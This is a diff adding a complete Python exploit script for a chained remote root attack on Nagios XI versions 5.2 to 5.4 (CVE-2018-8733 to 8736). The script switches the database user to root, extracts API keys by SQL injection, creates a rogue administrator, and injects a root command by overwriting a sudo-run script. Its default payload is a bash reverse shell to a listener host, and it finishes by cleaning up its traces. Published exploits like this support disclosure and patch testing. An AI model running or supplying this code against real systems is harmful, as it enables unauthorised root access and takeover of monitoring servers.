@@ -1,0 +1,450 @@
+# Exploit Title: Nagios XI 5.2.[6-9], 5.3, 5.4 Chained Remote Root
+# Date: 4/17/2018
+# Exploit Authors: Benny Husted, Jared Arave, Cale Smith
+# Contact: https://twitter.com/iotennui || https://twitter.com/BennyHusted || https://twitter.com/0xC413
+# Vendor Homepage: https://www.nagios.com/
+# Software Link: https://assets.nagios.com/downloads/nagiosxi/5/ovf/nagiosxi-5.4.10-64.ova
+# Version: Nagios XI versions 5.2.[6-9], 5.3, 5.4
+# Tested on: CentOS 6.7
+# CVE: CVE-2018-8733, CVE-2018-8734, CVE-2018-8735, CVE-2018-8736
+
+import httplib
+import urllib
+import ssl
+import sys
+import base64
+import random
+import time
+import string
+import json
+import re
+from optparse import OptionParser
+
+# Print some helpful words:
+print """
+###############################################################################
+Nagois XI 5.2.[6-9], 5.3, 5.4 Chained Remote Root
+This exploit leverages the vulnerabilities enumerated in these CVES:
+[ CVE-2018-8733, CVE-2018-8734, CVE-2018-8735, CVE-2018-8736 ]
+
+More details here:
+http://blog.redactedsec.net/exploits/2018/04/26/nagios.html
+
+Steps are as follows:
+
+0. Determine Version
+1. Change the database user to root:nagiosxi
+2. Get an API key w/ SQLi
+3. Use the API Key to add an administrative user
+4. Login as that administrative user
+5. Do some authenticated RCE w/ privesc
+6. Cleanup.
+###############################################################################
+"""
+# TODO: Figure out what port it's running on, 80 or 443.
+
+def parse_apikeys(resp):
+  begin_delim = 'START_API:'
+  end_delim   = ':END_API'
+
+  start_indecies = [m.start() for m in re.finditer(begin_delim, resp)]
+  end_indecies = [m.start() for m in re.finditer(end_delim, resp)]
+
+  unique_keys = []
+
+  for i, index in enumerate(start_indecies):
+    start_index = index + len(begin_delim)
+    end_index = end_indecies[i]
+    key = resp[start_index:end_index]
+    if not key in unique_keys:
+      unique_keys.append(key)
+
+  return unique_keys
+
+def parse_nsp_str(resp):
+    begin_delim = 'var nsp_str = "'
+    end_delim = '";\n'
+
+    start_index = resp.find(begin_delim) + len(begin_delim)
+    resp = resp[start_index:]
+    end_index = resp.find(end_delim)
+
+    return resp[:end_index]
+
+def parse_cmd_id(resp, cmdname):
+
+    begin_delim = "'"
+    end_delim = "', '{0}')\"><img src='images/cross.png' alt='Delete'>".format(cmdname)
+
+    end_idx = resp.find(end_delim)
+
+    resp = resp[:end_idx]
+    resp = resp[resp.rfind(begin_delim)+1:]
+
+    return resp
+
+def parse_nagiosxi(resp):
+    resp = str(resp)
+    begin_delim = 'Set-Cookie: nagiosxi='
+    end_delim = ';'
+
+  # find the last instance of the nagiosxi cookie...
+    start_index = resp.rfind(begin_delim) + len(begin_delim)
+    resp = resp[start_index:]
+    end_index = resp.find(end_delim)
+
+    return resp[:end_index]
+
+def parse_version(resp):
+    resp = str(resp)
+    begin_delim = 'name="version" value="'
+    end_delim = '"'
+
+    start_index = resp.rfind(begin_delim) + len(begin_delim)
+    resp = resp[start_index:]
+    end_index = resp.find(end_delim)
+
+    return resp[:end_index]
+def change_db_user(usr, pwd, step):
+
+    url = '/nagiosql/admin/settings.php'
+    headers = {'Host' : RHOST,
+               'Content-Type' : 'application/x-www-form-urlencoded'}
+
+    params = urllib.urlencode({
+    'txtRootPath':'nagiosql',
+    'txtBasePath':'/var/www/html/nagiosql/',
+    'selProtocol':'http',
+    'txtTempdir':'/tmp',
+    'selLanguage':'en_GB',
+    'txtEncoding':'utf-8',
+    'txtDBserver':'localhost',
+    'txtDBport':3306,
+    'txtDBname':'nagiosql',
+    'txtDBuser': usr,
+    'txtDBpass':pwd,
+    'txtLogoff':3600,
+    'txtLines':15,
+    'selSeldisable':1
+    })
+
+    print "[+] STEP {0}: Setting Nagios QL DB user to {1}.".format(step, usr)
+    print "[+] STEP {0}: http://{1}{2}".format(step, RHOST, url)
+
+    con = httplib.HTTPConnection(RHOST, 80)
+    con.set_debuglevel(0)
+    con.request("POST", url, params, headers=headers)
+
+    resp = con.getresponse()
+    con.close()
+
+    return resp
+
+# Disable SSL Cert validation
+if hasattr(ssl, '_create_unverified_context'):
+            ssl._create_default_https_context = ssl._create_unverified_context
+
+# Parse command line args:
+usage = "Usage: %prog -r <appliance_ip> -l <listener_ip> -p <listener_port>\n"\
+        "       %prog -r <appliance_ip> -c 'touch /tmp/foooooooooooo'"
+
+parser = OptionParser(usage=usage)
+parser.add_option("-r", '--RHOST', dest='rhost', action="store",
+          help="Target Nagios XI host")
+parser.add_option("-l", '--LHOST', dest='lhost', action="store",
+                  help="Host listening for reverse shell connection")
+parser.add_option("-p", '--LPORT', dest='lport', action="store",
+                  help="Port on which nc is listening")
+parser.add_option("-c", '--cmd', dest='cmd', action="store",
+          help="Run a custom command, no reverse shell for you.")
+
+(options, args) = parser.parse_args()
+
+if not options.rhost:
+    parser.error("[!] No remote host specified.\n")
+    parser.print_help()
+    sys.exit(1)
+
+RHOST = options.rhost
+LHOST = options.lhost
+LPORT = options.lport
+if options.cmd:
+    cmd = options.cmd
+else:
+    cmd = 'bash -i >& /dev/tcp/{0}/{1} 0>&1 &'.format(LHOST, LPORT)
+
+################################################################
+# REQUEST ZERO: GET NAGIOS VERSION
+################################################################
+
+url0 = '/nagiosxi/login.php'
+headers0 = {'Host' : RHOST,
+            'Content-Type' : 'application/x-www-form-urlencoded'}
+
+print "[+] STEP 0: Get Nagios XI version string."
+print "[+] STEP 0: http://{0}{1}".format(RHOST, url0)
+
+con0 = httplib.HTTPConnection(RHOST, 80)
+con0.set_debuglevel(0)
+con0.request("POST", url0, headers=headers0)
+r0 = con0.getresponse()
+
+r0_resp = r0.read()
+version = parse_version(r0_resp)
+ver_int = int(version.split('.')[1])
+
+con0.close()
+print "[+] STEP 0: Nagios XI verions is: {0}".format(version)
+
+################################################################
+# REQUEST ONE: CHANGE THE DATABASE USER TO ROOT
+################################################################
+
+
+r1 = change_db_user('root', 'nagiosxi', '1')
+
+if r1.status == 302:
+    print "[+] STEP 1: Received a 302 Response. That's good!"
+else:
+    print "[!] STEP 1: Received a {0} Response. That's bad.".format(str(r1.status))
+    exit()
+
+
+################################################################
+# REQUEST TWO: GET THE API KEY USING SQLi
+################################################################
+
+print ""
+url2 = '/nagiosql/admin/helpedit.php'
+headers2 = {'Host' : RHOST,
+                        'Content-Type' : 'application/x-www-form-urlencoded'}
+
+# Versions of NagiosXI < 5.3.0 use 'backend_ticket', not 'api_key'.
+sqli_param = "api_key" if (ver_int >= 3) else "backend_ticket"
+print sqli_param
+
+params2 = urllib.urlencode({
+    'selInfoKey1':'c\'UNION SELECT CONCAT(\'START_API:\',{0},\':END_API\') FROM nagiosxi.xi_users-- '.format(sqli_param),
+    'hidKey1':'common',
+    'selInfoKey2':'free_variables_name',
+    'hidKey2':'',
+    'selInfoVersion':'',
+    'hidVersion':'',
+    'taContent':'',
+    'modus':0,
+    '':''
+    })
+
+print "[+] STEP 2: Exploiting SQLi to extract user API keys."
+print "[+] STEP 2: http://{0}{1}".format(RHOST, url2)
+
+con2 = httplib.HTTPConnection(RHOST, 80)
+con2.set_debuglevel(1)
+con2.request("POST", url2, params2, headers=headers2)
+r2 = con2.getresponse()
+
+if r2.status == 302:
+    print "[+] STEP 2: Received a 302 Response. That's good!"
+else:
+    print "[!] STEP 2: Received a {0} Response. That's bad.".format(str(r2.status))
+    exit()
+
+con2.close()
+
+r2_resp = r2.read()
+api_keys = parse_apikeys(r2_resp)
+random.shuffle(api_keys)
+
+if len(api_keys) > 0:
+    print "[+] Found {0} unique API keys. Cool:".format(str(len(api_keys)))
+    for key in api_keys:
+        print "[+] {0}".format(key)
+else:
+    print "[!] No API keys found! Oh no. Exiting..."
+    exit()
+
+
+################################################################
+# REQUEST THREE: USE THE API KEY TO ADD AN ADMIN USER
+################################################################
+
+print ""
+url3 = '/nagiosxi/api/v1/system/user?apikey=XXXAPIKEYLIVESHEREXXX&pretty=1'
+headers3 = {'Host' : RHOST,
+                        'Content-Type' : 'application/x-www-form-urlencoded'}
+
+# Generate the sketchiest username possibe :D
+sploit_username = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(16))
+# And also the worlds best password
+sploit_password = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(16))
+
+params3 = urllib.urlencode({
+    'username':sploit_username,
+    'password':sploit_password,
+    'name':'Firsty Lasterson',
+    'email':'{0}@localhost'.format(sploit_username),
+    'auth_level':'admin',
+    'force_pw_change':0
+    })
+
+print "[+] STEP 3: Using API Keys to add an administrative user..."
+
+found_it = False
+for i, key in enumerate(api_keys):
+    url3_try = url3.replace('XXXAPIKEYLIVESHEREXXX', key)
+    print "[+] STEP 3: http://{0}{1}".format(RHOST, url3_try)
+
+    con3 = httplib.HTTPConnection(RHOST, 80)
+    con3.set_debuglevel(0)
+    con3.request("POST", url3_try, params3, headers=headers3)
+    r3 = con3.getresponse()
+    r3_contents = r3.read()
+
+    if r3.status == 200:
+        print "[+] STEP 3: Received a 200 Response. That's good!"
+        if "was added successfully" in r3_contents:
+            print "[+] STEP 3: User account username:{0} passwd: {1} was added successfully!".format(sploit_username, sploit_password)
+            print "[+] STEP 3: Moving to Step 4...."
+            found_it = True
+            con3.close()
+            break
+        else:
+            "[!] STEP 3: API_KEY access was denied. That's bad."
+            continue
+    else:
+        print "[!] STEP 3: Received a {0} Response. That's bad.".format(str(r2.status))
+        continue
+
+        print "[!] STEP 3: Failed to add a user. Try some more API keys..."
+    con3.close()
+
+if found_it == False:
+    print "[!] STEP 3: Step 3 failed.... oh no!"
+
+################################################################
+# REQUEST FOUR: LOGIN AS ADMINISTRATIVE USER
+################################################################
+
+print ""
+print "[+] STEP 4.1: Authenticate as user TODO."
+print "[+] STEP 4.1: Get NSP for login..."
+url4p1 = '/nagiosxi/login.php'
+headers4p1 = {'Host' : RHOST}
+params4p1 = ""
+
+con4p1 = httplib.HTTPConnection(RHOST, 80)
+con4p1.set_debuglevel(0)
+con4p1.request("POST", url4p1, params4p1, headers=headers4p1)
+r4p1 = con4p1.getresponse()
+
+r4p1_resp = r4p1.read()
+
+login_nsp = parse_nsp_str(r4p1_resp)
+login_nagiosxi = parse_nagiosxi(r4p1.msg)
+
+con4p1.close()
+
+print "[+] STEP 4.1: login_nsp = {0}".format(login_nsp)
+print "[+] STEP 4.1: login_nagiosxi = {0}".format(login_nagiosxi)
+
+# 4.2 ---------------------------------------------------------------
+
+print "[+] STEP 4.2: Authenticating..."
+
+url4p2 = '/nagiosxi/login.php'
+headers4p2 = {'Host' : RHOST,
+                          'Content-Type' : 'application/x-www-form-urlencoded',
+                          'Cookie' : 'nagiosxi={0}'.format(login_nagiosxi)}
+params4p2 = urllib.urlencode({
+                        'nsp':login_nsp,
+                        'page':'auth',
+                        'debug':'',
+                        'pageopt':'login',
+                        'username':sploit_username,
+                        'password':sploit_password,
+                        'loginButton':'',
+                        })
+
+con4p2 = httplib.HTTPConnection(RHOST, 80)
+con4p2.set_debuglevel(0)
+con4p2.request("POST", url4p2, params4p2, headers=headers4p2)
+r4p2 = con4p2.getresponse()
+r4p2_resp = r4p2.read()
+authed_nagiosxi = parse_nagiosxi(r4p2.msg)
+con4p2.close()
+
+print "[+] STEP 4.2: authed_nagiosxi = {0}".format(authed_nagiosxi)
+
+# 4.3 ---------------------------------------------------------------
+
+print "[+] STEP 4.3: Getting an authed nsp token..."
+
+url4p3 = '/nagiosxi/index.php'
+headers4p3 = {'Host' : RHOST,
+                          'Content-Type' : 'application/x-www-form-urlencoded',
+                          'Cookie' : 'nagiosxi={0}'.format(authed_nagiosxi)}
+params4p3 = ""
+
+con4p3 = httplib.HTTPConnection(RHOST, 80)
+con4p3.set_debuglevel(0)
+con4p3.request("POST", url4p3, params4p3, headers=headers4p3)
+r4p3 = con4p3.getresponse()
+r4p3_resp = r4p3.read()
+authed_nsp = parse_nsp_str(r4p3_resp)
+con4p3.close()
+
+print "[+] STEP 4.3: authed_nsp = {0}".format(authed_nsp)
+
+################################################################
+# REQUEST FIVE: Excute command
+################################################################
+
+print "[+] STEP 5: Executing command as root!..."
+url5 = '/nagiosxi/backend/index.php?'
+headers5 = {'Host' : RHOST,
+            'Content-Type' : 'application/x-www-form-urlencoded',
+            'Cookie' : 'nagiosxi={0}'.format(authed_nagiosxi)}
+
+privesc_cmd = 'cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak && echo "{0}" > /usr/local/nagiosxi/scripts/reset_config_perms.sh && sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh && mv /usr/local/nagiosxi/scripts/reset_config_perms.sh.bak /usr/local/nagiosxi/scripts/reset_config_perms.sh'.format(cmd)
+privesc_cmd = "$(" + privesc_cmd + ")"
+
+url5 = url5 + urllib.urlencode({
+                                'cmd':'submitcommand',
+                                'command':'1111',
+                                'command_data':privesc_cmd
+                                })
+
+con5 = httplib.HTTPConnection(RHOST, 80)
+con5.set_debuglevel(0)
+con5.request("POST", url5, headers=headers5)
+r5 = con5.getresponse()
+
+r5_resp = r5.read()
+con5.close()
+
+if r5.status == 200:
+    print "[+] STEP 5: Received a 200 Response. That's good!"
+else:
+    print "[!] STEP 5: Received a {0} Response. That's bad.".format(str(r5.status))
+    exit()
+
+print "[+] STEP 5: Successfully ran command. We're done?"
+
+
+################################################################
+# REQUEST SIX: Cleanup
+################################################################
+
+print "[+] STEP 6: Cleanup time"
+
+r1 = change_db_user('nagiosql', 'n@gweb', '6')
+
+if r1.status == 302:
+    print "[+] STEP 6: Received a 302 Response. That's good!"
+else:
+    print "[!] STEP 6: Received a {0} Response. That's bad.".format(str(r1.status))
+    exit()
+
+################################################################
+# Solution: Update to a version of NagiosXI >= 5.4.13
+################################################################
